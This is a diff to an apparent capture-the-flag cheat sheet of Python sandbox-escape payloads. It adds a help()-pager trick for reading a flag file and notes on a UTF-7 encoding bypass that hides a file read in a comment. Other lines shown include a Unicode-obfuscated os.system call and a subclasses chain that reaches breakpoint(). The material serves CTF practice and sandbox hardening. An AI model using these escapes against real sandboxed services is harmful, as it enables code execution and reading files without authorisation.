@@ -80,7 +80,9 @@ eval(input())
 ```
 
 ### Read a file
-
+```py
+help() # then send "print\n:e/flag"
+```
 ```py
 # to stderr
 exit(set(open("flag")))
@@ -173,12 +175,15 @@ _＿𝘪𝘮𝘱𝘰𝘳𝘵＿_(𝘪𝘯𝘱𝘶𝘵()).system(𝘪𝘯𝘱𝘶
 ().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["breakpoint"]()
 ```
 ### Bypass parsers using comments and encodings
-(only works if everything is put into a file and then executed)
+This only works in certain cases:
+ - Everything is put into a file and then executed
+ - There is something like `exec(data)` where `type(data) == bytes`
 ```py
 # -*- coding: utf_7 -*-
 def f(x):
     return x
     #+AAo-print(open("flag.txt").read())
+# Thanks @collodel
 ```
 
 ### multiple exec, no dots, no builtins/builtins blacklisted  + other blacklisted words 
